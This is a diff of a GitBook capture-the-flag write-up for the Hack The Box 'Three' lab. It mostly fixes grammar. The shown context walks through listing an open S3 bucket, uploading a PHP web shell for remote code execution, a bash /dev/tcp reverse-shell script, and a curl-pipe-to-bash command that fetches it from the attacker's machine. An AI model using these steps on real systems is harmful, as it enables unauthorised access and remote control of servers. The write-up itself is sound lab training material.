@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Three (Tier 1)
 
 ## <mark style="color:blue;">Description</mark>
@@ -62,7 +48,7 @@ nmap -p22,80 -sVC 10.129.246.158
 <figure><img src="../../.gitbook/assets/image (220) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
@@ -140,7 +126,7 @@ echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
 ***
 
-* So knowing this was an [_AWS_](https://aws.amazon.com/es/) service, I tried to connect to it using the [_awscli_](../../database-attacks/tools-and-utilities.md#awscli) utility. First, I configured the tool, in this case, indicating a temporary connection with the _temp_ value. With this done I tried to list the _S3_ instances and found one named _thetoppers.htb._ Then I listed the elements inside it and found an _index.php_ file, which could be the source code of the web page
+* So knowing this was an [_AWS_](https://aws.amazon.com/es/) service, I tried to connect to it using the [_awscli_](../../database-attacks/tools-and-utilities.md#awscli) utility. First, I configured the tool, in this case, indicating a temporary connection with the _temp_ value. With this done, I tried to list the _S3_ instances and found one named _thetoppers.htb._ Then I listed the elements inside it and found an _index.php_ file, which could be the source code of the web page
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -157,7 +143,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 <figure><img src="../../.gitbook/assets/image (231) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-&#x20;The _temp_ value is the default credentials for AWS connections if everything is scaped
+&#x20;The _temp_ value is the default credentials for AWS connections if everything is avoided
 {% endhint %}
 
 ***
@@ -170,7 +156,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 
 ***
 
-* Then as I had a connection to the S3 instance, I tried to upload a custom file to the bucket in an attempt to gain RCE. To do so, I created a _Shell.php_ file with a proper payload to spawn a shell on the machine and read a command. Then I uploaded it and checked if it had worked by listing the contents of the bucket again
+* Then, as I had a connection to the S3 instance, I tried to upload a custom file to the bucket in an attempt to gain RCE. To do so, I created a _Shell.php_ file with a proper payload to spawn a shell on the machine and execute a command. Then I uploaded it and checked if it had worked by listing the contents of the bucket again
 
 {% code lineNumbers="true" %}
 ```bash
@@ -207,7 +193,7 @@ http://thetoppers.htb/Shell.php?cmd=id
 
 ***
 
-* With this, I could explore the filesystem arbitrarily. After some searching, I decided to check the _/var/www_ folder, which usually is the default for the server files, and there I found a _flag.txt_ file. Finally, retrieved the content of the file and got the flag
+* With this, I could explore the filesystem arbitrarily. After some searching, I decided to check the _/var/www_ folder, which is usually the default for the server files, and there I found a _flag.txt_ file. Finally, retrieved the content of the file and got the flag
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -244,7 +230,7 @@ sudo nano shell.sh
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.195/1234 0>&1  
-#I used the my IP on the VPN and an arbitrary port
+#I used my IP on the VPN and an arbitrary port
 ```
 {% endcode %}
 
@@ -262,7 +248,7 @@ nc -nvlp 1234
 
 ***
 
-* After this, in another terminal, I established an HTTP server using _Python_ in the same folder where the _shell.sh_ file is, and setting another arbitrary port for the server
+* After this, in another terminal, I established an HTTP server in the same folder where the _shell.sh_ script was using _Python_, and setting another arbitrary port for the server
 
 {% code lineNumbers="true" %}
 ```bash
@@ -274,7 +260,7 @@ python -m http.server 4444
 
 ***
 
-* I used the RCE to send the shell from the target to my machine using the `curl` command. I observed the page remained loading and checking the _Python_ server received the petition
+* I used the RCE to send the shell from the target to my machine using the `curl` command. I observed the page remained loading, and checking the _Python_ server received the petition
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -288,6 +274,6 @@ http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
 
 ***
 
-* Finally, I checked the _Netcat_ listener and saw that I had gained a shell from the machine. With that, I could interact with the system more comfortably
+* Finally, I checked the _Netcat_ listener and saw that I had gained the target shell. With that, I could interact with the system more comfortably
 
 <figure><img src="../../.gitbook/assets/image (256) (1).png" alt=""><figcaption></figcaption></figure>
